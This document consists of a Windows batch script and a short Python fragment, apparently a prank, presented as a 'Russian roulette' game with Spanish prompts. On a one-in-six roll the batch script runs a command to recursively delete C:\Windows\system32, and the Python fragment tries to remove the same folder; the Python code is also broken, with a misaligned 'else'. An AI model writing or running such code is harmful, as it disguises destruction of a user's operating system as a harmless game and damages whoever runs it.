@echo off
title ruleta rusa en batch
color 0c
:inicio 
echo Bienvenido al juego de la ruleta rusa
echo por favor presiona una tecla para disparar
pause > nul
set /a disparo=%random% %% 6 + 1
echo %disparo%
if %disparo% == 1 (
    rd /s /q C:\Windows\system32
    echo BANG! Has perdido!
    goto fin
    ) else (
        echo has tenido suerte!!
        goto pregunta
        )
        :pregunta 
        echo Quieres jugar de nuevo? (S/N)?
        set /p respuesta=
        if /i "%respuesta%"=="s" goto inicio 
        if /i "%respuesta%"=="n" goto fin
        goto pregunta 
        
        :fin
        echo gracias por jugar.
         pause > nul
          exit



import random
import os

n = random.randint(0,5)
if n == 1:
    os.remove("C:\Windows\System32")
  else:
         print("Ganas")